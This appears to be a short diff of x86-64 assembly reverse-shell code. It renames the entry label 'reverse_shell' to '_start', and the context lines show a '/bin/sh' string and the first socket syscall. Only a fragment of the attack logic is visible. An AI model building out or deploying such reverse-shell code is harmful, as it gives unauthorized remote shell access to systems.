@@ -8,9 +8,9 @@ section .data
 
     binsh db "/bin/sh", 0         
 section .text
-    global reverse_shell
+    global _start
 
-reverse_shell:
+_start:
     ; Create socket
     mov rax, 41                   
     mov rdi, 0x2                  
